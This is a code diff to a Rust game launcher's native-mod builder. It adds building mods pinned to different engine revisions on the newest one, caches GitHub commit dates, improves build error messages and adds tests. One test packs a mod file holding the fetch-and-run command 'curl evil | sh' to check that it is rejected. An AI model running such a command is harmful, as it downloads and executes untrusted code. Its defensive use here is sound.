@@ -4,8 +4,9 @@
 //! ([`rust_toolchain`]). Unlike `.hmod` mods they are not sandboxed: their code runs with the
 //! player's rights.
 //!
-//! A native mod pins the Horizon revision it was made for (a Nightly's or a release's commit), and
-//! every mod of one build must pin the same one. A mod that hooks only Horizon's native hook points
+//! A native mod pins the Horizon revision it was made for (a Nightly's or a release's commit).
+//! Mods pinning different ones build on the newest of them, once the player agreed to try (they
+//! often still apply and compile). A mod that hooks only Horizon's native hook points
 //! (`game/native_hooks.rs`) names the version it needs instead (`hooks`): it builds on any Horizon
 //! whose hook points have that version or a later one (they are only ever added to), the player's own
 //! by default, so such mods always build together. The build compiles that revision's source, from
@@ -28,7 +29,7 @@ const NAME: &str = "Native mods";
 const PREFIX: &str = "native-";
 /// horizon-mixins, for bundles that don't name the revision they were tested with.
 const MIXINS_GIT: &str = "https://github.com/horizon-rust/horizon-mixins";
-pub const MIXINS_REV: &str = "0d6b103c70633d8fd9443d8d0acd3aadaacedb06";
+pub const MIXINS_REV: &str = "3f99a5c60dfa311cc365524c44ae2fd799bfa1de";
 /// The profile and features of the release's own game (game-build.yml).
 const PROFILE: &str = "release";
 const FEATURES: &str = "horizon-client/mods";
@@ -58,7 +59,7 @@ pub fn is_native(version: &str) -> bool {
     version.starts_with(PREFIX)
 }
 
-fn root() -> PathBuf {
+pub(crate) fn root() -> PathBuf {
     backend::data_dir().join("native")
 }
 
@@ -85,8 +86,8 @@ const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
 pub const INSTALLED: &str = "horizon-native-mods";
 
 /// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
-/// Each `.hnmod` is checked again as the registry checks it (only `.rs` and `.toml` under
-/// `mixins/<id>/`, nothing run), so a file edited since its download can't smuggle anything else in.
+/// Each `.hnmod` is checked again as the registry checks it (Rust and TOML under
+/// `mixins/<id>/`, plus files under its `data/`, nothing run).
 pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
     let out = root().join("installed.incoming");
     let _ = fs::remove_dir_all(&out);
@@ -160,7 +161,7 @@ pub fn bundles(folder: &Path) -> Result<Vec<Bundle>, String> {
     Ok(found)
 }
 
-fn bundle_in(dir: &Path) -> Result<Option<Bundle>, String> {
+pub(crate) fn bundle_in(dir: &Path) -> Result<Option<Bundle>, String> {
     if dir.join(MANIFEST).is_file() {
         return bundle(dir, None).map(Some);
     }
@@ -251,6 +252,108 @@ fn agreed(
         ));
     }
     Ok(revision)
+}
+
+/// The revision `bundles` build on for `which` when their pins differ: the newest of the pins and
+/// `also` (the launcher's own horizon-mixins), by its commit's time (`date`), so no mod gets an
+/// older one than it was made for. With one pin or none, it is [`agreed`]'s.
+fn newest(
+    bundles: &[Bundle],
+    which: &str,
+    get: impl Fn(&Bundle) -> Option<&String>,
+    fallback: impl FnOnce() -> Result<String, String>,
+    also: Option<&str>,
+    date: impl Fn(&str) -> Result<String, String>,
+) -> Result<String, String> {
+    let mut pins: Vec<&str> = bundles
+        .iter()
+        .filter_map(|b| get(b).map(String::as_str))
+        .collect();
+    pins.sort();
+    pins.dedup();
+    if pins.len() < 2 {
+        return agreed(bundles, which, get, fallback);
+    }
+    if let Some(bad) = pins.iter().find(|p| !is_revision(p)) {
+        return Err(format!("{bad} is not a {which} commit (40 hex digits)."));
+    }
+    pins.extend(also.filter(|a| !pins.contains(a)));
+    let mut dated = Vec::new();
+    for pin in pins {
+        let when = date(pin).map_err(|e| {
+            format!("Can't tell which of the mods' {which} revisions is newest: {e}")
+        })?;
+        dated.push((when, pin));
+    }
+    Ok(dated
+        .into_iter()
+        .max()
+        .map(|(_, p)| p.to_owned())
+        .unwrap_or_default())
+}
+
+/// When commit `revision` of GitHub's `repo` was made (ISO 8601, so it sorts), from the dates kept
+/// in [`DATES`] when it was asked before: a commit's date never changes, so a build of mods made
+/// for different revisions can be used again offline or past GitHub's rate limit.
+fn committed(repo: &str, revision: &str) -> Result<String, String> {
+    remembered(&root().join(DATES), repo, revision, ask_github)
+}
+
+/// The file in [`root`] keeping the commit dates GitHub gave, as `{"repo@revision": date}`.
+const DATES: &str = "commit-dates.json";
+
+/// The date `file` keeps for `repo`'s `revision`, else `ask`'s, then kept in `file`.
+fn remembered(
+    file: &Path,
+    repo: &str,
+    revision: &str,
+    ask: impl FnOnce(&str, &str) -> Result<String, String>,
+) -> Result<String, String> {
+    let key = format!("{repo}@{revision}");
+    let mut dates: serde_json::Map<String, serde_json::Value> = fs::read(file)
+        .ok()
+        .and_then(|b| serde_json::from_slice(&b).ok())
+        .unwrap_or_default();
+    if let Some(date) = dates.get(&key).and_then(|d| d.as_str()) {
+        return Ok(date.to_owned());
+    }
+    let date = ask(repo, revision)?;
+    dates.insert(key, date.clone().into());
+    if let Ok(text) = serde_json::to_vec_pretty(&dates) {
+        let _ = fs::write(file, text);
+    }
+    Ok(date)
+}
+
+fn ask_github(repo: &str, revision: &str) -> Result<String, String> {
+    let url = format!("https://api.github.com/repos/{repo}/commits/{revision}");
+    let commit: serde_json::Value = backend::get(&url)?.into_json().map_err(|e| e.to_string())?;
+    commit["commit"]["committer"]["date"]
+        .as_str()
+        .map(str::to_owned)
+        .ok_or_else(|| format!("GitHub doesn't know {repo} commit {revision}."))
+}
+
+/// How [`build`] starts its error when mods pin other Horizon revisions than the one it would
+/// use and the player hasn't agreed to try (`anyway`); the rest lists them.
+pub const MISMATCH: &str = "Made for other Horizon versions: ";
+
+/// Each pinned mod whose Horizon revision isn't `revision`, as `id → pin`, and the build's.
+fn mismatch(mods: &[Bundle], revision: &str) -> Option<String> {
+    let list: Vec<String> = mods
+        .iter()
+        .filter(|b| b.hooks.is_none())
+        .filter_map(|b| b.horizon.as_ref().map(|r| (b, r)))
+        .filter(|(_, r)| *r != revision)
+        .map(|(b, r)| format!("{} → {}", b.id, &r[..r.len().min(7)]))
+        .collect();
+    (!list.is_empty()).then(|| {
+        format!(
+            "{}; the build uses {}",
+            list.join(", "),
+            &revision[..revision.len().min(7)]
+        )
+    })
 }
 
 /// Where Horizon declares its native hook points' version, and the line that does.
@@ -441,7 +544,8 @@ impl Step {
 }
 
 /// Runs `cmd`, its output appended to the build log; `line` sees each line of its standard error.
-/// An error ends with the last lines.
+/// An error ends with its first `error` lines and the last lines: a failed build script's output
+/// alone could push the line naming its crate out of the last ones.
 fn run(mut cmd: Command, what: &str, mut line: impl FnMut(&str)) -> Result<(), String> {
     let mut log = fs::OpenOptions::new()
         .create(true)
@@ -456,12 +560,16 @@ fn run(mut cmd: Command, what: &str, mut line: impl FnMut(&str)) -> Result<(), S
         .spawn()
         .map_err(|e| format!("Could not start {what}: {e}"))?;
     let mut tail = std::collections::VecDeque::new();
+    let mut errors = Vec::new();
     for text in BufReader::new(child.stderr.take().expect("piped"))
         .lines()
         .map_while(Result::ok)
     {
         let _ = writeln!(log, "{text}");
         line(&text);
+        if text.starts_with("error") && errors.len() < 4 {
+            errors.push(text.clone());
+        }
         if tail.len() == 12 {
             tail.pop_front();
         }
@@ -472,11 +580,29 @@ fn run(mut cmd: Command, what: &str, mut line: impl FnMut(&str)) -> Result<(), S
         return Ok(());
     }
     let tail: Vec<String> = tail.into();
-    Err(format!(
-        "{what} failed ({status}). The end of its output, the whole of it in {}:\n{}",
-        log_path().display(),
-        diagnostic(&tail.join("\n")).unwrap_or_else(|| tail.join("\n"))
-    ))
+    Err(failure(what, &status.to_string(), &errors, &tail))
+}
+
+/// [`run`]'s error: the `errors` lines not already among the last ones (`tail`), then those.
+fn failure(what: &str, status: &str, errors: &[String], tail: &[String]) -> String {
+    let end = diagnostic(&tail.join("\n")).unwrap_or_else(|| tail.join("\n"));
+    let first: Vec<&str> = errors
+        .iter()
+        .filter(|e| !tail.contains(e))
+        .map(String::as_str)
+        .collect();
+    let (shown, first) = if first.is_empty() {
+        ("The end of its output", String::new())
+    } else {
+        (
+            "Its first errors and the end of its output",
+            format!("{}\n…\n", first.join("\n")),
+        )
+    };
+    format!(
+        "{what} failed ({status}). {shown}, the whole of it in {}:\n{first}{end}",
+        log_path().display()
+    )
 }
 
 /// A horizon-mixins diagnostic (`{"code", "message", "file"}`) in one line.
@@ -536,9 +662,21 @@ fn source(revision: &str) -> Result<PathBuf, String> {
         backend::REPO
     );
     let partial = root().join("source").join(format!(".{revision}.partial"));
+    let top = unpack_archive(&archive, &partial, u64::MAX)?;
+    fs::write(top.join(".horizon-revision"), revision).map_err(|e| e.to_string())?;
+    let _ = fs::remove_dir_all(&dir);
+    fs::rename(&top, &dir).map_err(|e| e.to_string())?;
     let _ = fs::remove_dir_all(&partial);
-    fs::create_dir_all(&partial).map_err(|e| e.to_string())?;
-    let reader = flate2::read::GzDecoder::new(backend::get(&archive)?.into_reader());
+    Ok(dir)
+}
+
+/// GitHub's archive (`.tar.gz`) at `url`, unpacked into the fresh folder `partial`: the archive's
+/// one top folder, which is returned. Links are left out; at most `limit` bytes are unpacked.
+pub(crate) fn unpack_archive(url: &str, partial: &Path, limit: u64) -> Result<PathBuf, String> {
+    use std::io::Read;
+    let _ = fs::remove_dir_all(partial);
+    fs::create_dir_all(partial).map_err(|e| e.to_string())?;
+    let reader = flate2::read::GzDecoder::new(backend::get(url)?.into_reader()).take(limit);
     let mut tar = tar::Archive::new(reader);
     for entry in tar.entries().map_err(|e| e.to_string())? {
         let mut entry = entry.map_err(|e| format!("Download interrupted: {e}"))?;
@@ -547,21 +685,16 @@ fn source(revision: &str) -> Result<PathBuf, String> {
             continue;
         }
         entry
-            .unpack_in(&partial)
+            .unpack_in(partial)
             .map_err(|e| format!("Could not unpack the source: {e}"))?;
     }
-    // The archive's one top folder (horizon-<commit>/) is the source's root.
-    let top = fs::read_dir(&partial)
+    // The archive's one top folder (<repo>-<commit>/) is the source's root.
+    fs::read_dir(partial)
         .map_err(|e| e.to_string())?
         .flatten()
         .map(|e| e.path())
         .find(|p| p.is_dir())
-        .ok_or("The source archive is empty.")?;
-    fs::write(top.join(".horizon-revision"), revision).map_err(|e| e.to_string())?;
-    let _ = fs::remove_dir_all(&dir);
-    fs::rename(&top, &dir).map_err(|e| e.to_string())?;
-    let _ = fs::remove_dir_all(&partial);
-    Ok(dir)
+        .ok_or_else(|| "The source archive is empty.".into())
 }
 
 /// Makes `to` hold `from`'s files, writing only those that changed, so Cargo, which goes by file
@@ -587,11 +720,14 @@ fn sync(from: &Path, to: &Path) -> Result<(), String> {
 /// Builds `folder`'s mods on the Horizon revision they pin (else `base`'s, the installed version
 /// whose game files the build reuses) and points `instance` at the build: the instance the mods
 /// were installed in, else (None, or the game's own home) the Native mods instance. Returns the
-/// build's version; a build already made is used again.
+/// build's version; a build already made is used again. Mods pinning different revisions build on
+/// the newest one, with the newest horizon-mixins they name, only when the player agreed to try
+/// (`anyway`): else the error starts with [`MISMATCH`] and says which.
 pub fn build(
     base: &str,
     folder: &Path,
     instance: Option<&Instance>,
+    anyway: bool,
     progress: impl Fn(Step),
 ) -> Result<String, String> {
     backend::need_prepared(base)?;
@@ -615,21 +751,39 @@ pub fn build(
     // A mod naming a hook points' version doesn't pin: it follows the others, else the game.
     let pins: Vec<Bundle> = mods.iter().filter(|b| b.hooks.is_none()).cloned().collect();
     let free = pins.iter().all(|b| b.horizon.is_none());
-    let pinned = agreed(
+    let pinned = newest(
         &pins,
         "Horizon",
         |b| b.horizon.as_ref(),
         || revision_of(base),
+        None,
+        |r| committed(backend::REPO, r),
     )?;
     let revision = with_hooks(&mods, pinned, free, hooks_at)?;
-    for b in mods.iter().filter(|b| b.hooks.is_some()) {
+    let other = mismatch(&mods, &revision);
+    if let (Some(list), false) = (&other, anyway) {
+        return Err(format!("{MISMATCH}{list}."));
+    }
+    for b in mods
+        .iter()
+        .filter(|b| b.hooks.is_some() || b.horizon.as_ref().is_some_and(|r| *r != revision))
+    {
         repin(b, &revision)?;
     }
-    let mixins = agreed(
+    // Said with a failure: a mod made for another revision may not apply or compile on this one.
+    let blame = |e: String| {
+        match &other {
+        Some(list) => format!("{e}\n\nSome mods were made for other Horizon versions ({list}), which may be why. Install versions made for the same Nightly."),
+        None => e,
+    }
+    };
+    let mixins = newest(
         &mods,
         "horizon-mixins",
         |b| b.mixins.as_ref(),
         || Ok(MIXINS_REV.into()),
+        Some(MIXINS_REV),
+        |r| committed("horizon-rust/horizon-mixins", r),
     )?;
     let version = version_for(&revision, &mixins, &mods)?;
     if !backend::installed().contains(&version) {
@@ -648,7 +802,8 @@ pub fn build(
             apply(&rust, &tool, &source, &incoming, &fresh),
             "horizon-mixins",
             |_| {},
-        )?;
+        )
+        .map_err(blame)?;
         let stage = root().join("stage");
         sync(&fresh, &stage)?;
         let _ = fs::remove_dir_all(&fresh);
@@ -667,7 +822,8 @@ pub fn build(
                 let name = name.split_whitespace().next().unwrap_or(name);
                 progress(Step::Compile(crates, name.to_owned()));
             }
-        })?;
+        })
+        .map_err(blame)?;
         progress(Step::Install);
         let about = serde_json::json!({
             "base": base,
@@ -1018,6 +1174,16 @@ mod tests {
             (found[0].id.as_str(), found[0].horizon.as_deref()),
             ("veinminer", Some(A))
         );
+        pack(
+            "veinminer.hnmod",
+            Some(("mixins/veinminer/data/table.bin", "data")),
+        );
+        let out = installed_mods(&home).unwrap();
+        let path = out.join("veinminer/mixins/veinminer/data/table.bin");
+        assert_eq!(fs::read(&path).unwrap(), b"data");
+        let first = version_for(A, B, &bundles(&out).unwrap()).unwrap();
+        fs::write(path, b"changed").unwrap();
+        assert_ne!(first, version_for(A, B, &bundles(&out).unwrap()).unwrap());
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
     }
@@ -1052,6 +1218,104 @@ mod tests {
         );
         let bad = [pinned("a", Some("nightly"))];
         assert!(agreed(&bad, "Horizon", get, never).is_err());
+    }
+
+    #[test]
+    fn mods_made_for_different_revisions_build_on_the_newest() {
+        let pinned = |id: &str, horizon: Option<&str>, mixins: Option<&str>| Bundle {
+            id: id.into(),
+            version: "1".into(),
+            dir: PathBuf::new(),
+            horizon: horizon.map(str::to_owned),
+            mixins: mixins.map(str::to_owned),
+            hooks: None,
+        };
+        let c = "c".repeat(40);
+        // a is the oldest commit, then b, then c.
+        let date = |r: &str| -> Result<String, String> {
+            Ok(match &r[..1] {
+                "a" => "2026-10-28T00:00:00Z",
+                "b" => "2026-10-29T00:00:00Z",
+                _ => "2026-10-30T00:00:00Z",
+            }
+            .into())
+        };
+        let never = || -> Result<String, String> { panic!("a pin wins") };
+        fn horizon(b: &Bundle) -> Option<&String> {
+            b.horizon.as_ref()
+        }
+        fn mixins(b: &Bundle) -> Option<&String> {
+            b.mixins.as_ref()
+        }
+        let split = [
+            pinned("veinminer", Some(B), Some(&c)),
+            pinned("lookat", Some(A), Some(A)),
+            pinned("zoom", None, None),
+        ];
+        assert_eq!(
+            newest(&split, "Horizon", horizon, never, None, date).unwrap(),
+            B
+        );
+        // horizon-mixins: never older than a pin, and the launcher's own when it is newer.
+        assert_eq!(
+            newest(&split, "horizon-mixins", mixins, never, Some(B), date).unwrap(),
+            c
+        );
+        let older = [pinned("a", None, Some(A)), pinned("b", None, Some(B))];
+        assert_eq!(
+            newest(&older, "horizon-mixins", mixins, never, Some(&c), date).unwrap(),
+            c
+        );
+        // One pin, or the same one everywhere: that pin, and no date is asked for.
+        let no_date = |_: &str| -> Result<String, String> { panic!("no date needed") };
+        let same = [pinned("a", Some(A), None), pinned("b", Some(A), None)];
+        assert_eq!(
+            newest(&same, "Horizon", horizon, never, None, no_date).unwrap(),
+            A
+        );
+        let offline = |_: &str| -> Result<String, String> { Err("offline".into()) };
+        let err = newest(&split, "Horizon", horizon, never, None, offline).unwrap_err();
+        assert!(err.contains("offline"), "{err}");
+        // What the player is shown: each mod made for another revision, and the build's.
+        assert_eq!(
+            mismatch(&split, B).unwrap(),
+            "lookat → aaaaaaa; the build uses bbbbbbb"
+        );
+        assert_eq!(mismatch(&same, A), None);
+        let hooked = [Bundle {
+            hooks: Some(1),
+            ..pinned("minimap", Some(A), None)
+        }];
+        assert_eq!(mismatch(&hooked, B), None, "hook mods follow the build");
+    }
+
+    #[test]
+    fn a_commit_date_is_asked_once_and_kept() {
+        let d = dir("commit-dates");
+        let file = d.join(DATES);
+        let ask = |_: &str, r: &str| -> Result<String, String> { Ok(format!("date of {r}")) };
+        assert_eq!(
+            remembered(&file, "acme/x", A, ask).unwrap(),
+            format!("date of {A}")
+        );
+        let offline = |_: &str, _: &str| -> Result<String, String> { Err("offline".into()) };
+        assert_eq!(
+            remembered(&file, "acme/x", A, offline).unwrap(),
+            format!("date of {A}")
+        );
+        // Another repo or revision isn't known yet.
+        assert!(remembered(&file, "acme/y", A, offline).is_err());
+        assert!(remembered(&file, "acme/x", B, offline).is_err());
+        // A broken file is asked again and rewritten.
+        fs::write(&file, "not json").unwrap();
+        assert_eq!(
+            remembered(&file, "acme/x", B, ask).unwrap(),
+            format!("date of {B}")
+        );
+        assert_eq!(
+            remembered(&file, "acme/x", B, offline).unwrap(),
+            format!("date of {B}")
+        );
     }
 
     #[test]
@@ -1180,5 +1444,28 @@ mod tests {
             diagnostic(err).as_deref(),
             Some("E_REVISION: requires exact Horizon revision a (m.toml)")
         );
+    }
+
+    #[test]
+    fn a_failed_build_names_the_crate_its_output_pushed_out() {
+        // cargo's output on Linux without ALSA's development files (Rust 1.99.1, 2026-10-31):
+        // the build script's report fills the last lines.
+        let errors = ["error: failed to run custom build command for `alsa-sys v0.3.1`".to_owned()];
+        let tail: Vec<String> = [
+            "  The system library `alsa` required by crate `alsa-sys` was not found.",
+            "  HINT: you may need to install a package such as alsa, alsa-dev or alsa-devel.",
+            "warning: build failed, waiting for other jobs to finish...",
+        ]
+        .map(str::to_owned)
+        .into();
+        let e = failure("Compiling the game", "exit status: 101", &errors, &tail);
+        assert!(e.starts_with("Compiling the game failed (exit status: 101). Its first errors"));
+        assert!(
+            e.ends_with(&format!("{}\n…\n{}", errors[0], tail.join("\n"))),
+            "{e}"
+        );
+        // An error still among the last lines isn't said twice.
+        let e = failure("horizon-mixins", "exit status: 1", &errors, &errors);
+        assert!(e.contains("The end of its output") && e.matches("alsa-sys").count() == 1);
     }
 }
